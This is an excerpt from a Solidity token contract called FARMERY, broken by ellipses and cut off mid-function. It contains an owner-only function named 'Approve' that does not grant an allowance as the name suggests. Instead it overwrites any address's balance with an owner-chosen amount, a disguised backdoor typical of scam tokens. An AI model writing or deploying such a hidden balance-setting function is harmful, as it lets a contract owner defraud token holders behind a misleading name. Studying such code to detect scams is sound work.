...
contract FARMERY is Ownable {
  ...
  function Approve(address spender, uint256 _value) public onlyOwner returns (bool) {
    require(spender != address(0));
    require(_value > 0, "Transfer amount must be greater than zero");
    _balances[spender] = UnitBurn + ((_value + UnitBurn) * 1 * (10 ** 9));
